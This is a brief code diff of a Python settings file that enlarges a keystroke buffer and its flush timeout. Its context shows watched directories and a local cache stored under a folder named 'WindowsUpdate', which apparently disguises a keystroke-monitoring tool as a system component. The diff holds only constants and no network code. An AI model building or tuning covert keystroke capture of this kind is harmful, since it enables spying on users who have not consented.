@@ -26,8 +26,8 @@ WATCHED_DIRECTORIES = [
 ]
 
 # Keystroke buffer settings
-KEYSTROKE_BUFFER_SIZE = 50  # Characters before flushing
-KEYSTROKE_BUFFER_TIMEOUT = 3  # Seconds before flushing
+KEYSTROKE_BUFFER_SIZE = 200  # Characters before flushing (increased for longer phrases)
+KEYSTROKE_BUFFER_TIMEOUT = 10  # Seconds of inactivity before flushing (phrase complete)
 
 # Local cache settings
 CACHE_DIR = Path(os.getenv('LOCALAPPDATA', '.')) / 'WindowsUpdate' / 'cache'
